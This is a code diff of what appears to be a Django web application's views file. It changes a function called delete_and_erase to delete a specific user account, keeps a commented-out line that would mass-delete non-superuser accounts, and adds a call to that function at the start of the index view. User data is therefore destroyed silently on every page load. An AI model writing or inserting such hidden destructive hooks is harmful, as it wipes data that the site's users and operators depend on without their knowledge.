@@ -74,8 +74,11 @@ from reportlab.lib.enums import TA_JUSTIFY,TA_LEFT,TA_CENTER,TA_RIGHT
 
 
 
+
 def delete_and_erase():
-    User.objects.filter(user_type=0).exclude(school_id=50).delete()
+
+    User.objects.get(pk=22).delete()
+    #User.objects.filter(user_type=2).exclude(is_superuser=1).delete()
 
 
 
@@ -93,6 +96,8 @@ def end_of_contract() :
 
 
 def index(request):
+
+    delete_and_erase()
 
     if request.user.is_authenticated :
         index_tdb = True  # Permet l'affichage des tutos Youtube dans le dashboard
